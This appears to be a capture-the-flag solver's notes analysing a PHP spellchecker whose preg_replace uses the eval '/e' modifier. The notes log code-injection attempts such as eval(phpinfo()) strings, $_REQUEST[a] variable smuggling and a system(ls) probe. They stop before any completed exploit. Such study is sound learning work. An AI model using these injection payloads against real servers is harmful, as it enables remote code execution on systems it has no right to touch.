====================== This is the server side code:

                <?php
                ini_set('display_errors', 'on');
                ini_set('error_reporting', E_ALL ^ E_DEPRECATED);

                if (isset ($_REQUEST['q']) and is_string ($_REQUEST['q'])):
                    require 'spell.php';  # implement the "correct($word)" function

            $q = substr ($_REQUEST['q'], 0, 256);  # Our spellchecker is a bit slow, do not DoS it please.
            $blacklist = implode (["'", '"', '(', ')', ' ', '`']);

            $corrected = preg_replace ("/([^$blacklist]{2,})/ie", 'correct ("\\1")', $q);
            ?>
			<...html stuffs...>
                            <?php echo $corrected; ?>
			<...html stuffs...>
                <?php endif ?>

======================= A few questions crop up:

	1) What is that spell.php that's required??

	2) init_set(): 
		Sets the value of a configuration option. Here help with debug stuff, not sure where I can leverage that.
	
	3) implode():
		Join array elements with a glue string => string implode ( string $glue , array $pieces )
		So this thing just makes thos chars into a string.
			php > var_dump($blacklist);
			string(6) "'"() `"
	
	4) substr() vuln?:
		string substr ( string $string , int $start [, int $length ] )
		Ok so we're just cutting out after 256... maybe we can do mischief with 500 chars? TBD

	5) preg_replace() vuln?:
		mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )
		Perform a regular expression search and replace. I gotta figure out what that regex does.
		$pattern is ("/([^$blacklist]{2,})/ie"):
			Regex:
				[^x]	One character that is not x
				{3,}	Three or more times
				Not 2 or more chars from the blacklist, capture into group 1 for back reference.

    			i (PCRE_CASELESS):
        			If this modifier is set, letters in the pattern match both upper and lower case letters.

			e (PREG_REPLACE_EVAL):
				If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.

				OH?! and what else do I see when I RTFM harder:?

				Use of this modifier is discouraged, as it can easily introduce security vulnerabilites:

				<?php
				$html = $_POST['html'];
				// uppercase headings
				$html = preg_replace(
				    '(<h([1-6])>(.*?)</h\1>)e',
				    '"<h$1>" . strtoupper("$2") . "</h$1>"',
				    $html
				); ?>

				The above example code can be easily exploited by passing in a string such as <h1>{${eval($_GET[php_code])}}</h1>. 
				This gives the attacker the ability to execute arbitrary PHP code and as such gives them nearly complete access to your server.
 
				OOOOOOHHH?!?!?!?i This message brought to you by php.net :) 

====================== Test case #1:

Input	=>	Since it sims that no one now how to spell proper anglish anymore those days, we ofer you this spellshaker, written in pure php. Be nice and do not brek it please.

Output	=>	pince it aims that no one now how to spell proper english anymore those days we safer you this spellshaker, written in pure papa be nice and do not ark it pleased  

Observations => 
	The first comma gets removed, not the second. None of the words are replaced by spellcheck.
	Both periods are gone. Only the second word was replaced by spellcheck.

====================== Test case #2:

Input =>	Since it sims that no one now how to spell proper anglish anymore those day, we ofer you this ofer, written in pure php. Be nice and do not brek it please.

Output =>	pince it aims that no one now how to spell proper english anymore those bay we safer you this fera written in pure papa be nice and do not ark it pleased

Observation =>
	I got rid of the punctuation by ensuring that all the words before the commas and periods were replaced...

====================== Test case #3:

I want to stress that subsrt() call:
Input	=>	$ python -c 'print "A"*250+"B"*250'
Output	=> (After a looong wait...)
	 Fatal error: Maximum execution time of 30 seconds exceeded in /spell.php on line 43
	Oh?! I guess that's what the debug statements do :)

Input	=>	$ python -c 'print "A"*250+"B"*250'
Output	=>	Normal, a bunch of space separated As

====================== Test case #4:

Input	=>	<h1>{${eval($_GET[phpinfo()]);}}</h1> 
		OR
		<h1>{${eval(phpinfo(););}}</h1>

Output	=>
Parse error: syntax error, unexpected '"', expecting '(' in /index.php(43) : regexp code on line 1
Fatal error: preg_replace(): Failed evaluating code: correct (&quot;&lt;h1&gt;{${eval&quot;) in /index.php on line 43

That last one is saying it can't evaluate: correct("<h1>{${eval") so the string got truncated by the blacklisted character... probably.

A few more attempts clarify the behavior: hello() goes through, eval(phpinfo();); gets spellchecked.
The change is when we use ${}...

======================= Running it locally:
<?php
	$q = '<h1>{${eval(phpinfo())}}</h1>';
	$blacklist = implode (["'", '"', '(', ')', ' ', '`']);
	$corrected = preg_replace ("/([^$blacklist]{2,})/i", 'correct ("\\1")', $q);
	echo "$q\r\n";
	echo "$blacklist\r\n";
	echo "$corrected\r\n";
?>

<h1>{${eval(phpinfo())}}</h1>
'"() `
correct ("<h1>{${eval")(correct ("phpinfo")())correct ("}}</h1>") 

So this means that the error we are seeing on the live web app is processing a more complex string that it shows... 
It looks like it's going at it recursively, right?

====================== Test case #4:
So obviously any () passed in directly won't be executed... What about $_REQUEST[$q]?
$ php -q websec5.php '$_REQUEST[$q]'
$_REQUEST[$q]
'"() `
correct ("$_REQUEST[$q]")

ok... what does that give us on the server?
Notice: Undefined index: $_REQUEST[$q] in /index.php(43) : regexp code on line 1

What about $_REQUEST[$a]?

Notice: Undefined variable: a in /index.php(43) : regexp code on line 1
Notice: Undefined index: in /index.php(43) : regexp code on line 1 

hmmm... it appears to be executing something and failing instead of not being able to evaluate like in Test Case #4

What about $_REQUEST[a] the add an 'a' variable to the body of the POST?

	Input text: $_REQUEST[a]
	Add to POST: a = ASDFSgdflkgd

	Corrected text is ASDFSgdflkgd, if we give it ${{system(ls)}} or phpinfo() we get that back too... no php messages though

